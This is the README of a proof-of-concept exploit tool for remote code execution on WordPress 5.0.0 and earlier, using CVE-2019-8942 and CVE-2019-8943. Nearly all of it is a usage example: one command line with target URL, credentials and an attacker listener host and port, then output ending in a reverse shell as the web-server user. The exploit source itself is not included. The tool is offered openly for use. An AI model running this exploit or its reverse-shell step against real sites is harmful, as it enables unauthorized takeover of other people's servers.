## WordPress 5.0.0 Crop-image Remote Code Execution
### Description
The exploit code leverages the [CVE-2019-8943](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-8943) and [CVE-2019-8942](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942/) vulnerabilities to gain remote code execution on WordPress 5.0.0 and <= 4.9.8.

### Usage

```
root@kali:~# python3 poc.py --url http://mysite.com -u kwheel -p qwerty -lhost 10.10.6.2 -lport 443
[*] Authenticating to wordpress
[+] Login successful
[*] Uploading image
[+] Image uploaded
[*] Updating image
[*] Including image into theme
[*] Creating post
[*] Starting listener on 443
[*] Executing reverse shell
bash: cannot set terminal process group (921): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blog:/var/www/wordpress$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### References:
[https://blog.sonarsource.com/wordpress-image-remote-code-execution/](https://blog.sonarsource.com/wordpress-image-remote-code-execution/)

[https://www.youtube.com/watch?v=6Sxs4vQJK\_s](https://www.youtube.com/watch?v=6Sxs4vQJK_s)
